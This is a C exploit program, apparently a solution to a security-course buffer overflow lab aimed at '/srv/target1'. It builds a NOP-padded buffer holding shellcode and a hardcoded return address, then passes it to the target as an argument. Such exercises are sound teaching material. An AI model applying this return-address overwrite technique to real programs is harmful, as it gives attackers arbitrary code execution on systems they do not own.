#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

int main(void)
{
    char exploit[20];
    char *args[3];
    char *env[1];

    memset(exploit, 0x90, sizeof(exploit));

    memcpy(exploit, shellcode, sizeof(shellcode) - 1);

    uint32_t ret_address = 0xffffd518; 
    memcpy(exploit + 16, &ret_address, 4);

    args[0] = TARGET;
    args[1] = exploit;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}